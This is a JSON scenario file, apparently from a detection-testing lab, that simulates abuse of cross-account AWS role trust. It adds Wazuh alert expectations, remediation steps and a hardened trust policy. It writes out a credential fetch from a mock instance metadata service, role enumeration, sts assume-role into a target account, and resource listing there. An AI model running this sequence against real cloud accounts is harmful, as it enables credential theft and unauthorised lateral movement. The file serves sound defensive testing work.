@@ -1,0 +1,182 @@
+{
+  "id": "S2-03",
+  "name": "Cross-Account Role Assumption Abuse",
+  "category": "Cloud Service Accounts",
+  "version": "1.0",
+  "description": "Abuse cross-account trust relationships to pivot to other AWS accounts",
+  "difficulty": "Hard",
+  "real_world_relevance": "Multi-account AWS breaches, supply chain attacks via trusted roles",
+
+  "mitre_attack": {
+    "tactics": ["Lateral Movement", "Privilege Escalation"],
+    "techniques": [
+      {"id": "T1078.004", "name": "Valid Accounts: Cloud Accounts"},
+      {"id": "T1550.001", "name": "Use Alternate Authentication Material: Application Access Token"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["cloud-workload", "mock-imds"],
+    "network": "cloud_net"
+  },
+
+  "attack_flow": {
+    "description": "Attacker discovers and abuses cross-account role trust to pivot accounts",
+    "diagram": [
+      "1. Attacker compromises credentials in Account A",
+      "2. Attacker enumerates assumable roles",
+      "3. Attacker discovers trust relationship with Account B",
+      "4. Attacker assumes role in Account B",
+      "5. Attacker now has access to multiple accounts"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Initial Access",
+      "description": "Obtain credentials for source account",
+      "actions": [
+        {
+          "type": "http_request",
+          "target": "http://172.41.0.100:1338/latest/meta-data/iam/security-credentials/demo-ec2-instance-role",
+          "method": "GET",
+          "expected_response_contains": ["AccessKeyId"]
+        }
+      ]
+    },
+    {
+      "name": "Trust Discovery",
+      "description": "Enumerate cross-account trust relationships",
+      "actions": [
+        {
+          "type": "command",
+          "command": "aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS]]'",
+          "description": "Find roles with cross-account trust"
+        },
+        {
+          "type": "command",
+          "command": "aws iam get-role --role-name CrossAccountRole --query 'Role.AssumeRolePolicyDocument'",
+          "description": "Inspect trust policy"
+        }
+      ]
+    },
+    {
+      "name": "Role Assumption",
+      "description": "Assume role in target account",
+      "critical": true,
+      "actions": [
+        {
+          "type": "command",
+          "command": "aws sts assume-role --role-arn arn:aws:iam::TARGET-ACCOUNT:role/CrossAccountRole --role-session-name attacker-session",
+          "expected_output_contains": ["AccessKeyId", "SecretAccessKey", "SessionToken"]
+        }
+      ]
+    },
+    {
+      "name": "Lateral Movement",
+      "description": "Use new credentials to access target account",
+      "actions": [
+        {
+          "type": "command",
+          "command": "aws s3 ls --profile target-account",
+          "description": "List S3 buckets in target account"
+        },
+        {
+          "type": "command",
+          "command": "aws ec2 describe-instances --profile target-account",
+          "description": "List EC2 instances in target account"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "CloudTrail",
+      "description": "sts:AssumeRole calls to external accounts",
+      "wazuh_rule": "100703"
+    },
+    {
+      "type": "CloudTrail",
+      "description": "API calls from assumed role with unusual source",
+      "wazuh_rule": "100704"
+    },
+    {
+      "type": "CloudTrail",
+      "description": "Cross-account role assumption from EC2 instance",
+      "wazuh_rule": "100705"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "100703",
+      "level": 10,
+      "description": "NHI: Cross-account role assumption detected"
+    },
+    {
+      "rule_id": "100704",
+      "level": 12,
+      "description": "NHI: Suspicious API activity from assumed role"
+    },
+    {
+      "rule_id": "100705",
+      "level": 14,
+      "description": "NHI: EC2 instance assuming cross-account role - LATERAL MOVEMENT"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Revoke cross-account role sessions",
+      "Review all API calls made with assumed credentials",
+      "Update trust policies to restrict principals"
+    ],
+    "long_term": [
+      "Implement external ID requirement for cross-account roles",
+      "Use IAM Roles Anywhere instead of static trust",
+      "Monitor cross-account activity with CloudTrail Lake",
+      "Implement MFA requirement for sensitive role assumptions"
+    ],
+    "secure_trust_policy": {
+      "Version": "2012-10-17",
+      "Statement": [
+        {
+          "Effect": "Allow",
+          "Principal": {"AWS": "arn:aws:iam::TRUSTED-ACCOUNT:root"},
+          "Action": "sts:AssumeRole",
+          "Condition": {
+            "StringEquals": {"sts:ExternalId": "unique-external-id"},
+            "Bool": {"aws:MultiFactorAuthPresent": "true"}
+          }
+        }
+      ]
+    }
+  },
+
+  "demo_script": {
+    "container": "cloud-workload",
+    "commands": [
+      "# List roles with cross-account trust",
+      "aws iam list-roles | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS != null)'",
+      "",
+      "# Attempt to assume cross-account role",
+      "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/CrossAccountRole --role-session-name demo"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "AWS Cross-Account Access",
+      "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/tutorial_cross-account-with-roles.html"
+    },
+    {
+      "title": "External ID Best Practice",
+      "url": "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_create_for-user_externalid.html"
+    },
+    {
+      "title": "MITRE ATT&CK T1550.001",
+      "url": "https://attack.mitre.org/techniques/T1550/001/"
+    }
+  ]
+}
